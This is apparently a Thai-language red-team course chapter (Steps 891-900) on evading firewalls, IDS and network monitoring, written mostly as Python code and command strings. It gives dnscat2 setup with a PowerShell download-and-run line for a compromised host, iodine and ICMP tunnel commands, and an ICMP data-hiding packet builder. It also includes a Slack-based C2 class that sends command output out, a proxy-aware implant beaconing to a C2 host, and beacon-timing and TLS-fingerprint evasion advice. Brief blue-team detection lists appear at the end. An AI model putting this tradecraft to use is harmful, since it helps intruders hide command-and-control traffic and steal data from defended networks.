# Part 90: Advanced Network Evasion (Steps 891-900)

## ภาพรวม
เทคนิคขั้นสูงในการหลบเลี่ยงการตรวจจับผ่านเครือข่าย - IDS/IPS, DPI, NGFW, และ EDR Network sensors

---

## Step 891: Network Detection Evasion Overview

```python
from dataclasses import dataclass, field
from typing import List, Dict
from enum import Enum

class NetworkControl(Enum):
    FIREWALL = "Next-Gen Firewall (NGFW)"
    IDS = "Intrusion Detection System"
    IPS = "Intrusion Prevention System"
    DPI = "Deep Packet Inspection"
    PROXY = "Web Proxy / SSL Inspection"
    NDR = "Network Detection & Response"
    EDR_NET = "EDR Network Sensor"

@dataclass
class EvasionTechnique:
    name: str
    target_control: NetworkControl
    description: str
    effectiveness: str  # Low/Medium/High
    complexity: str
    mitre_id: str

class NetworkEvasionFramework:
    """กรอบการทำงาน Network Evasion"""
    
    EVASION_TECHNIQUES = [
        EvasionTechnique(
            name="Domain Fronting",
            target_control=NetworkControl.PROXY,
            description="Route C2 traffic through CDN hiding real destination",
            effectiveness="High",
            complexity="Medium",
            mitre_id="T1090.004"
        ),
        EvasionTechnique(
            name="DNS over HTTPS",
            target_control=NetworkControl.DPI,
            description="Encrypt DNS queries via HTTPS to evade DNS monitoring",
            effectiveness="High",
            complexity="Low",
            mitre_id="T1048.003"
        ),
        EvasionTechnique(
            name="Protocol Tunneling",
            target_control=NetworkControl.FIREWALL,
            description="Tunnel data in allowed protocols (DNS, ICMP, HTTP)",
            effectiveness="Medium",
            complexity="High",
            mitre_id="T1572"
        ),
        EvasionTechnique(
            name="Packet Fragmentation",
            target_control=NetworkControl.IDS,
            description="Fragment packets to bypass signature reassembly",
            effectiveness="Medium",
            complexity="Low",
            mitre_id="T1001.001"
        ),
        EvasionTechnique(
            name="Traffic Mimicry",
            target_control=NetworkControl.NDR,
            description="Make C2 traffic look like normal HTTP/TLS traffic",
            effectiveness="High",
            complexity="High",
            mitre_id="T1001.003"
        )
    ]
    
    def select_techniques(self, target_control: NetworkControl) -> List[EvasionTechnique]:
        return [t for t in self.EVASION_TECHNIQUES if t.target_control == target_control]
    
    def network_baseline_analysis(self) -> List[str]:
        """Before testing: analyze allowed protocols"""
        return [
            "Identify allowed outbound protocols (HTTP, HTTPS, DNS, NTP)",
            "Check if SSL inspection is present (cert substitution)",
            "Identify proxy requirements (transparent vs explicit)",
            "Map firewall egress rules from target network",
            "Check if DNS is filtered (DNS sinkholing)",
            "Identify network monitoring tools deployed"
        ]

if __name__ == '__main__':
    fw = NetworkEvasionFramework()
    print("Network Evasion Techniques:")
    for tech in fw.EVASION_TECHNIQUES:
        print(f"  [{tech.effectiveness}] {tech.name} -> {tech.target_control.value}")
    print("\nBaseline Analysis Steps:")
    for step in fw.network_baseline_analysis():
        print(f"  - {step}")
```

---

## Step 892: DNS Tunneling

การส่งข้อมูลผ่าน DNS queries

```python
import base64
import dns.resolver
from typing import List, Optional

class DNSTunneling:
    """อธิบายและสาธิต DNS Tunneling"""
    
    def encode_data_for_dns(self, data: bytes, domain: str) -> List[str]:
        """เข้ารหัสข้อมูลเป็น DNS queries"""
        # DNS label limit: 63 chars, total domain limit: 255 chars
        # Encode data in Base32 (DNS-safe characters)
        encoded = base64.b32encode(data).decode('utf-8').rstrip('=')
        
        # Split into 63-char chunks for DNS labels
        chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
        queries = []
        for chunk in chunks:
            queries.append(f"{chunk}.{domain}")
        return queries
    
    def dns_c2_server_setup(self) -> str:
        """DNS C2 server configuration with dnscat2"""
        return """
# Server setup (on your domain's authoritative DNS)
# First: Point NS record to your server
# ns.yourdomain.com -> YOUR_SERVER_IP
# yourdomain.com NS ns.yourdomain.com

# Install and run dnscat2 server
gem install dnscat2
dnscat2 --dns domain=dns.yourdomain.com --secret=S3cr3tP@ss

# Client (on compromised host)
# PowerShell:
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://c2/dnscat2.ps1')
Start-Dnscat2 -Domain dns.yourdomain.com -Secret S3cr3tP@ss

# Linux client:
./dnscat --dns domain=dns.yourdomain.com --secret=S3cr3tP@ss
        """
    
    def iodine_dns_tunnel(self) -> str:
        """iodine DNS tunnel for full IP tunneling"""
        return """
# iodine - tunnels IPv4 over DNS
# Server side:
sudo iodined -f 10.0.0.1 dns.yourdomain.com

# Client side:
sudo iodine -f -P password 1.2.3.4 dns.yourdomain.com
# Now 10.0.0.2 is your DNS tunnel IP
ssh -D 1080 10.0.0.1  # SOCKS proxy through tunnel
        """
    
    def detect_dns_tunneling(self) -> List[str]:
        """Detection methods for DNS tunneling"""
        return [
            "Unusual high volume of DNS queries to single domain",
            "DNS queries with long/encoded subdomains (>30 chars)",
            "High entropy in subdomain names (base64/base32)",
            "Unusual DNS record types (TXT, NULL, CNAME for data)",
            "DNS query rate anomaly per client",
            "Suricata rule: dns.payload; content:'.c2domain.com'; threshold"
        ]

if __name__ == '__main__':
    tunnel = DNSTunneling()
    # Encode test data
    test_data = b"secret command output here"
    queries = tunnel.encode_data_for_dns(test_data, "dns.attacker.com")
    print("DNS Tunnel Queries:")
    for q in queries:
        print(f"  DNS Query: {q[:80]}")
    print("\nDetection Methods:")
    for detect in tunnel.detect_dns_tunneling():
        print(f"  - {detect}")
```

---

## Step 893: ICMP & Covert Channels

การใช้ ICMP และช่องทางลับคืออื่นๆ

```python
import socket
import struct
import os
import hashlib
from typing import Optional

class ICMPCovertChannel:
    """ช่องทางลับผ่าน ICMP"""
    
    def icmp_checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(data) % 2:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff
    
    def build_icmp_packet(self, payload: bytes, seq: int = 1) -> bytes:
        """Build ICMP echo request with data payload"""
        icmp_type = 8    # Echo Request
        icmp_code = 0
        identifier = os.getpid() & 0xFFFF
        
        # Header without checksum
        header = struct.pack('!BBHHH', icmp_type, icmp_code, 0, identifier, seq)
        checksum = self.icmp_checksum(header + payload)
        
        # Final header with checksum
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, seq)
        return header + payload
    
    def send_icmp_data(self, target: str, data: bytes, chunk_size: int = 64):
        """Send data hidden in ICMP echo requests"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print("ICMP requires root/admin privileges")
            return
        
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        print(f"Sending {len(data)} bytes in {len(chunks)} ICMP packets to {target}")
        
        for seq, chunk in enumerate(chunks):
            packet = self.build_icmp_packet(chunk, seq)
            # sock.sendto(packet, (target, 1))  # Actually send
            print(f"  Packet {seq}: {len(packet)} bytes")
    
    def ptunnel_setup(self) -> str:
        """ptunnel - TCP tunneling over ICMP"""
        return """
# ptunnel - tunnel TCP connections over ICMP echo packets

# Server (on machine you can reach via ICMP):
ptunnel-ng -daemon /var/log/ptunnel.pid

# Client:
# Tunnel SSH through ICMP to 10.10.10.1 server, 
# local port 2222 maps to SSH on the target
ptunnel-ng -p 10.10.10.1 -lp 2222 -da internal-host -dp 22
ssh -p 2222 localhost  # SSH through ICMP tunnel
        """
    
    def other_covert_channels(self) -> dict:
        """Other covert channel techniques"""
        return {
            "http_headers": (
                "Encode data in HTTP headers (User-Agent, X-Custom-Header)\n"
                "headers = {'User-Agent': base64.encode(cmd_output)}"
            ),
            "ntp_tunneling": (
                "Abuse NTP timestamp fields to carry data\n"
                "Less common, bypasses HTTP/HTTPS filtering"
            ),
            "tcp_timing": (
                "Timing-based covert channel\n"
                "0 = short inter-packet delay, 1 = long delay"
            ),
            "steganography": (
                "Hide data in image files\n"
                "Upload to image hosting, exfil via 'normal' web browsing"
            )
        }

if __name__ == '__main__':
    icmp = ICMPCovertChannel()
    test_data = b"Hello from ICMP covert channel!"
    print("ICMP Covert Channel Demo:")
    icmp.send_icmp_data("10.10.10.1", test_data)
    print("\nOther Covert Channels:")
    for channel, desc in icmp.other_covert_channels().items():
        print(f"  {channel}: {desc[:60]}...")
```

---

## Steps 894-900: Advanced Network Evasion

```python
from typing import Dict, List

class AdvancedNetworkEvasion:
    """Advanced network evasion techniques - Steps 894-900"""
    
    # Step 894: SSL/TLS Evasion
    TLS_EVASION = {
        "ja3_fingerprint_evasion": [
            "JA3 fingerprints TLS Client Hello (cipher suites, extensions)",
            "Change TLS settings to match legitimate software (Chrome, Firefox)",
            "Tools: ja3er.com to check your fingerprint",
            "Cobalt Strike: modify TLS profile to match browser fingerprint"
        ],
        "ssl_inspection_bypass": [
            "Use certificate pinning in implant",
            "Verify server certificate before connecting",
            "Use Let's Encrypt cert for C2 (trusted by all)",
            "Domain fronting bypasses SSL inspection at proxy"
        ],
        "mutual_tls": [
            "Client presents certificate to C2 server",
            "Only authorized implants can connect (auth via cert)",
            "Blocks researcher/defender sinkholing attempts"
        ]
    }
    
    # Step 895: HTTP/2 and QUIC evasion  
    MODERN_PROTOCOLS = {
        "http2_benefits": [
            "Multiplexing hides multiple requests in single connection",
            "Header compression reduces visibility",
            "Binary framing harder to inspect than HTTP/1"
        ],
        "quic_protocol": [
            "UDP-based, harder to inspect than TCP",
            "Built-in encryption (TLS 1.3)",
            "Many security tools don't inspect QUIC yet",
            "Use: nghttp2 or Golang h2 library for implementation"
        ]
    }
    
    # Step 896: Living off Trusted Sites (LoTS)
    LOTS_TECHNIQUE = {
        "definition": "Use legitimate cloud services for C2 to blend with allowed traffic",
        "services": [
            "GitHub Gist - store payload/commands",
            "Slack API - C2 over Slack",
            "Twitter/X API - C2 over social media",
            "OneDrive/SharePoint - file-based C2",
            "Google Docs - command storage",
            "Dropbox API - bidirectional C2"
        ],
        "slack_c2_example": """
import slack_sdk

class SlackC2:
    def __init__(self, token: str, channel: str):
        self.client = slack_sdk.WebClient(token=token)
        self.channel = channel
    
    def get_commands(self) -> List[str]:
        """Read commands from Slack channel"""
        result = self.client.conversations_history(channel=self.channel)
        return [msg['text'] for msg in result['messages']
                if msg.get('user') == 'OPERATOR_USER_ID']
    
    def send_output(self, output: str):
        """Send command output back to Slack"""
        self.client.chat_postMessage(
            channel=self.channel,
            text=f"```{output}```"
        )
        """
    }
    
    # Step 897: Proxying and routing evasion
    PROXY_EVASION = {
        "explicit_proxy": [
            "Configure implant to use system proxy settings",
            "WinInet/WinHTTP honors system proxy",
            "Read proxy from registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"
        ],
        "proxy_aware_implant": """
import urllib.request

# Automatically use system proxy settings
proxies = urllib.request.getproxies()
handler = urllib.request.ProxyHandler(proxies)
opener = urllib.request.build_opener(handler)
urllib.request.install_opener(opener)
response = urllib.request.urlopen('https://c2.example.com/beacon')
        """
    }
    
    # Step 898: Packet crafting and manipulation
    PACKET_CRAFTING = {
        "scapy_examples": """
from scapy.all import *

# Custom TCP packet with specific flags
pkt = IP(dst='10.10.10.1')/TCP(dport=443, flags='S')
send(pkt)

# Fragment IP packet
from scapy.all import fragment
pkts = fragment(IP(dst='10.10.10.1')/ICMP()/('X'*512), fragsize=8)
send(pkts)

# Craft custom DNS packet
dns_query = IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='c2.attacker.com', qtype='TXT'))
response = sr1(dns_query, timeout=2)
        """
    }
    
    # Step 899: Beacon timing and network OPSEC
    BEACON_TIMING = {
        "sleep_with_jitter": """
import random
import time

base_sleep = 300  # 5 minutes
jitter_percent = 30  # 30% jitter

while True:
    jitter = random.uniform(1 - jitter_percent/100, 1 + jitter_percent/100)
    sleep_time = int(base_sleep * jitter)
    time.sleep(sleep_time)
    beacon()
        """,
        "business_hours_only": """
from datetime import datetime
import pytz

def should_beacon():
    # Only beacon during business hours in target timezone
    tz = pytz.timezone('America/New_York')
    now = datetime.now(tz)
    # Monday=0, Friday=4
    if now.weekday() > 4:  # Weekend
        return False
    if now.hour < 8 or now.hour > 18:  # Outside 8am-6pm
        return False
    return True
        """
    }
    
    # Step 900: Network evasion detection by Blue Team
    DETECTION_SIGNATURES = {
        "dns_tunneling": [
            "High entropy subdomain names",
            "Unusually long DNS queries",
            "High DNS query frequency",
            "Rare DNS record types (TXT, NULL)"
        ],
        "domain_fronting": [
            "SNI mismatch with Host header",
            "Unusually high traffic to CDN endpoints",
            "Geographic mismatch in traffic patterns"
        ],
        "icmp_tunneling": [
            "Large ICMP echo payloads (normal is 32-64 bytes)",
            "High-frequency ICMP traffic",
            "Non-standard ICMP payload patterns"
        ],
        "c2_beaconing": [
            "Regular periodic connections (beaconing)",
            "Low-byte connections at regular intervals",
            "Domain Generation Algorithm (DGA) patterns"
        ]
    }
    
    def generate_network_evasion_report(self) -> str:
        return """
# Network Evasion Assessment Report

## Detected Controls
- [ ] Next-Gen Firewall with application control
- [ ] SSL/TLS inspection proxy
- [ ] IDS/IPS with signature detection
- [ ] Network Detection & Response (NDR)
- [ ] DNS filtering/sinkholing

## Evasion Techniques Tested
| Technique | Result | Notes |
|-----------|--------|-------|
| DNS Tunneling | Blocked/Allowed | |
| HTTPS C2 | Blocked/Allowed | |
| Domain Fronting | Blocked/Allowed | |
| Slack C2 | Blocked/Allowed | |

## Recommendations
- Implement SSL inspection for all egress traffic
- Deploy DNS monitoring (Cisco Umbrella, Cloudflare Gateway)
- Enable NDR with ML anomaly detection
        """

if __name__ == '__main__':
    evasion = AdvancedNetworkEvasion()
    print("TLS Evasion Techniques:")
    for tech, points in evasion.TLS_EVASION.items():
        print(f"\n  {tech}:")
        if isinstance(points, list):
            for p in points:
                print(f"    - {p}")
    print("\nLiving off Trusted Sites (LoTS):")
    print(f"  Definition: {evasion.LOTS_TECHNIQUE['definition']}")
    print("  Services:")
    for svc in evasion.LOTS_TECHNIQUE['services']:
        print(f"    - {svc}")
    print("\nDetection Signatures:")
    for sig_type, indicators in evasion.DETECTION_SIGNATURES.items():
        print(f"  {sig_type}: {len(indicators)} indicators")
```

---

## สรุป Part 90

1. **Step 891**: Network detection evasion overview - NGFW, IDS, DPI, NDR
2. **Step 892**: DNS tunneling - dnscat2, iodine, encoding data in queries
3. **Step 893**: ICMP covert channels - ptunnel, packet crafting
4. **Step 894**: SSL/TLS evasion - JA3 fingerprint, SSL inspection bypass
5. **Step 895**: HTTP/2 and QUIC protocol evasion
6. **Step 896**: Living off Trusted Sites (LoTS) - Slack, GitHub, Dropbox C2
7. **Step 897**: Proxy-aware implants for enterprise environments
8. **Step 898**: Packet crafting with Scapy
9. **Step 899**: Beacon timing - jitter, business hours only
10. **Step 900**: Blue team detection signatures and countermeasures

**เครื่องมือหลัก**: dnscat2, iodine, ptunnel, Scapy, Cobalt Strike malleable C2
